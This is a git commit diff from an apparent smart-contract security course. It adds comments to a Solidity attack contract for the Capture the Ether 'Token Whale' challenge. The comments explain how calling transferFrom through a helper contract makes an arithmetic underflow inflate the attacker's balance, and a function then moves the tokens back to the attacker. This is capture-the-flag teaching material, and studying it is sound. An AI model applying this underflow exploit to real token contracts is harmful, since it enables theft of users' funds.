3004d0a98b7c305237f26e9e1fb52575a5005264
Yul Puma <yulppuma@gmail.com>
2025-07-17 23:55:08 -0700

    Updated some comments, and added Readme

--- module-6/CaptureTheEtherHardhat/contracts/AttackTokenWhaleChallenge.sol
+++ module-6/CaptureTheEtherHardhat/contracts/AttackTokenWhaleChallenge.sol
@@ -9,9 +9,17 @@ contract AttackTokenWhaleChallenge{
         tokenWhaleChallenge = TokenWhaleChallenge(contractAddress);
     }
 
+    /**
+        Since the attackContract calls transferFrom, which then calls
+        _transfer after all the require statements, msg.sender will be
+        the attackContract. balanceOf[msg.sender]-=value will result
+        in underflow.
+     */
     function attack(address from, address to, uint256 value) public{
         tokenWhaleChallenge.transferFrom(from, to, value);
     }
+
+    //Transfer tokens back to the attacker after attacking TokenWhaleChallenge
     function transfer(address to, uint256 value) public{
         tokenWhaleChallenge.transfer(to, value);
     }
